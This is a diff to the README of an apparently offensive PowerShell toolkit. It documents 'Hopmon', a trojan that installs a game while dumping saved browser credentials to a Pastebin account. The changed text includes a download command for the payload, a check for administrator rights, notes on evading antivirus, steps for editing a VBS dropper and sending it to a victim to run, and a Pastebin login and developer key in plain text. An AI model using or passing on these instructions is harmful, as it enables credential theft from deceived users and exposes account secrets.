@@ -235,7 +235,7 @@ Warning: Invoke-Exclusions will 'NOT' delete itself or mspass.exe (deliver by -U
    
 |Binary Name|Description|Privileges|Notes|
 |---|---|---|---|
-|Hopmon|dumps credentials from major browsers|Administrator|lll|
+|[Hopmon](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Dump-Browser/Hopmon.ps1)|Install Hopmon game and dumps credentials from major browsers|Administrator|lll|
 
 <br />
 
@@ -266,9 +266,6 @@ only need to send Hopmon.exe to target user and convince him to execute it.<br /
 
 **prerequesites checks:**
 ```powershell
-#Make sure Windows Defender service its running
-[bool](Get-Service -Name "WinDefend")
-
 #Make sure we have administrator privileges in shell
 [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
 
@@ -288,34 +285,32 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 
 **Final Notes**
 ```
-**ACCESS-PASTEBIN-TO-REVIEW-CREDENTIALS-DUMP:**<br />
+ACCESS-PASTEBIN-TO-REVIEW-CREDENTIALS-DUMP:
   * The attacker needs to access URL : https://pastebin.com/u/pedro_testing
   * The attacker needs to login with username : pedro_testing
   * The attacker needs to login with password : angelapastebin
    - [The attacker can now review the contents of logfiles] -
 
-.WHAT-CAN-GO-WRONG?
-   * The target did not execute Hopmon.exe with admin
-     privileges when the EXE program asks for UAC access (admin)
-   * The target as a diferent anti-virus instaled besides windows defender (default)
-     and the probability of this scripts bypass other anti-virus detection its smaller.
-   * The target uses a web browser not supported by this project so it can not dump is credentials
-     Browsers supported are: Chromium, Chrome, Firefox, IE, MEdge, Safari, Opera 
+WHAT-CAN-GO-WRONG?
+  * The target did not execute Hopmon.exe with admin
+    privileges when the EXE program asks for UAC access (admin)
+  * The target as a diferent anti-virus instaled besides windows defender (default)
+    and the probability of this scripts bypass other anti-virus detection its smaller.
+  * The target uses a web browser not supported by this project so it can not dump is credentials
+   Browsers supported are: Chromium, Chrome, Firefox, IE, MEdge, Safari, Opera
 
-.FINAL-NOTES
-   * How to install a diferent game\program ?
-     a) Edit Hopmon.vbs script
-     b) Search inside the file for '-file Hopmon.ps1'
-     c) Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -Program Sunshine'
-     d) Send Hopmon.vbs (or compile to EXE) to target for manual execution.
+How to install a diferent game\program ?
+  a) Edit Hopmon.vbs script
+  b) Search inside the file for '-file Hopmon.ps1'
+  c) Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -Program Sunshine'
+  d) Send Hopmon.vbs (or compile to EXE) to target for manual execution.
 
-   * How to list WinGet (microsoft store) games available ?
-     Winget search games
+How to list WinGet (microsoft store) games available ?
+  Winget search games
 
-   * How to use a diferent pastebin account ?
-     a) Edit Hopmon.vbs script
-     b) Search inside the file for '-file Hopmon.ps1'
-     c) Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -PasteBinUserName r00t-3xp10it -PasteBinPassword angela -PastebinDeveloperKey 1ab4a1a4e39c94db4'
-     d) Send Hopmon.vbs (or compile to EXE) to target for manual execution.
-
+How to use a diferent pastebin account ?
+  a) Edit Hopmon.vbs script
+  b) Search inside the file for '-file Hopmon.ps1'
+  c) Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -PasteBinUserName r00t-3xp10it -PasteBinPassword angela -PastebinDeveloperKey 1ab4a1a4e39c94db4'
+  d) Send Hopmon.vbs (or compile to EXE) to target for manual execution.
 ```
